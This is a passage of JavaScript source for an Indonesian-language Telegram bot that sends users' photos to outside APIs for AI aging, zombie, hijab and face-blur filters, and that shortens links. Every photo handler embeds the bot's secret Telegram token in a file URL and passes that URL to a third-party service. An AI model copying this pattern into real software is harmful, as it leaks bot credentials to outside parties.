bot.onText(/^\/totua$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/totua';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/totua</code>\n\n` +
`<i>Balas foto yang ingin diubah jadi versi tua.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter penuaan AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/totua?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers['content-type'] || '';
if (contentType.startsWith('image/')) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>👴 Kamu jadi versi tua!</blockquote>\n` +
`<i>Filter penuaan AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>👴 Kamu jadi versi tua!</blockquote>\n` +
`<i>Filter penuaan AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Totua error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 👴 HANDLER UNTUK FOTO DENGAN CAPTION /TOTUA
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/totua') {
const messageText = 'PHOTO_CAPTION: /totua';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter penuaan AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/totua?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers['content-type'] || '';
if (contentType.startsWith('image/')) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>👴 Kamu jadi versi tua!</blockquote>\n` +
`<i>Filter penuaan AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>👴 Kamu jadi versi tua!</blockquote>\n` +
`<i>Filter penuaan AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Totua caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🧟 TOZOMBIE COMMAND - AI ZOMBIE FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/tozombie$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/tozombie';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/tozombie</code>\n\n` +
`<i>Balas foto yang ingin diubah jadi zombie.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter zombie AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tozombie?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers['content-type'] || '';
if (contentType.startsWith('image/')) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🧟 Kamu jadi zombie!</blockquote>\n` +
`<i>Filter zombie AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🧟 Kamu jadi zombie!</blockquote>\n` +
`<i>Filter zombie AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tozombie error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🧟 HANDLER UNTUK FOTO DENGAN CAPTION /TOZOMBIE
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/tozombie') {
const messageText = 'PHOTO_CAPTION: /tozombie';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter zombie AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tozombie?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers['content-type'] || '';
if (contentType.startsWith('image/')) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🧟 Kamu jadi zombie!</blockquote>\n` +
`<i>Filter zombie AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🧟 Kamu jadi zombie!</blockquote>\n` +
`<i>Filter zombie AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tozombie caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🔗 SHORTLINK COMMAND - SIMPLE API
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/shortlink(?:\s+(.+))?$/i, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const text = match[1];
const messageText = `/shortlink ${text || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
let url = '';
if (msg.reply_to_message && msg.reply_to_message.text) {
url = msg.reply_to_message.text.trim();
} else if (text) {
url = text.trim();
}
if (!url) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Contoh:</b> <code>/shortlink https://xyroorinzi.net</code>\n\n` +
`<i>Atau reply pesan yang berisi URL.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
const urlRegex = /^(https?:\/\/[^\s$.?#].[^\s]*)$/i;
if (!urlRegex.test(url)) {
return bot.sendMessage(chatId,
`<blockquote>❌ URL tidak valid!</blockquote>\n` +
`<b>URL Anda:</b> <code>${escapeHTML(url)}</code>\n\n` +
`<b>Contoh URL yang valid:</b>\n` +
`• https://example.com\n` +
`• http://website.net`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses shortlink...</blockquote>\n` +
`<b>URL:</b> <code>${escapeHTML(url.substring(0, 50))}${url.length > 50 ? '...' : ''}</code>\n` +
`<i>Menggunakan API NVidiaBotz...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
try {
const apiUrl = `https://api.nvidiabotz.xyz/tools/tinyurl?url=${encodeURIComponent(url)}`;
const response = await fetch(apiUrl);
if (!response.ok) {
throw new Error(`API error: ${response.status}`);
}
const data = await response.json();
console.log('API Response:', data);
if (!data.status || !data.result) {
throw new Error('API gagal memproses URL');
}
const finalShortUrl = data.result;
await bot.editMessageText(
`<blockquote>✅ Shortlink berhasil dibuat!</blockquote>\n\n` +
`<b>URL asli:</b>\n<code>${escapeHTML(url)}</code>\n\n` +
`<b>Hasil shortlink:</b>\n<code>${escapeHTML(finalShortUrl)}</code>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML',
reply_markup: {
inline_keyboard: [
[
{ text: '🔗 Buka Link', url: finalShortUrl }
]
]
}
}
);
} catch (error) {
console.error('Shortlink error:', error);
let errorMessage = '';
if (error.message.includes('API error')) {
errorMessage = `<blockquote>❌ API sedang gangguan!</blockquote>\n` +
`<i>Sistem shortlink sedang tidak bisa diakses.</i>`;
} else if (error.message.includes('gagal memproses')) {
errorMessage = `<blockquote>❌ Gagal memproses URL!</blockquote>\n` +
`<i>API tidak bisa memproses URL yang diberikan.</i>`;
} else {
errorMessage = `<blockquote>❌ Gagal membuat shortlink!</blockquote>\n` +
`<i>Terjadi kesalahan dalam sistem.</i>`;
}
try {
await bot.editMessageText(
errorMessage,
{ 
chat_id: chatId, 
message_id: processingMsg.message_id, 
parse_mode: 'HTML',
reply_markup: { inline_keyboard: [] }
}
);
} catch (editError) {
console.error('Failed to edit error message:', editError);
await bot.sendMessage(
chatId,
errorMessage,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🧕 TOHIJAB COMMAND - AI HIJAB FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/tohijab$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/tohijab';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/tohijab</code>\n\n` +
`<i>Balas foto yang ingin diberi hijab.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter hijab AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tohijab?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers['content-type'] || '';
if (contentType.startsWith('image/')) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🧕 Foto berhasil diberi hijab!</blockquote>\n` +
`<i>Filter hijab AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🧕 Foto berhasil diberi hijab!</blockquote>\n` +
`<i>Filter hijab AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tohijab error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🧕 HANDLER UNTUK FOTO DENGAN CAPTION /TOHIJAB
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/tohijab') {
const messageText = 'PHOTO_CAPTION: /tohijab';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter hijab AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tohijab?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers['content-type'] || '';
if (contentType.startsWith('image/')) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🧕 Foto berhasil diberi hijab!</blockquote>\n` +
`<i>Filter hijab AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🧕 Foto berhasil diberi hijab!</blockquote>\n` +
`<i>Filter hijab AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tohijab caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎫 TOBLUR COMMAND - BLUR WAJAH PADA FOTO
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/toblur$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/toblur';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/toblur</code>\n\n` +
`<i>Balas foto yang ingin diblur wajahnya.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mendeteksi dan mem-blur wajah...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/blurwajah?image=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers['content-type'] || '';
if (contentType.startsWith('image/')) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🙈 Wajah sudah diblur otomatis!</blockquote>\n` +
`<i>Foto berhasil diproses dengan AI blur wajah.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.image || jsonData.url || jsonData.result || jsonData.data?.url || jsonData.data;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🙈 Wajah sudah diblur otomatis!</blockquote>\n` +
`<i>Foto berhasil diproses dengan AI blur wajah.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Toblur error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎫 HANDLER UNTUK FOTO DENGAN CAPTION /TOBLUR
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/toblur') {
const messageText = 'PHOTO_CAPTION: /toblur';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mendeteksi dan mem-blur wajah...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/blurwajah?image=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers['content-type'] || '';
if (contentType.startsWith('image/')) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🙈 Wajah sudah diblur otomatis!</blockquote>\n` +
`<i>Foto berhasil diproses dengan AI blur wajah.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.image || jsonData.url || jsonData.result || jsonData.data?.url || jsonData.data;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
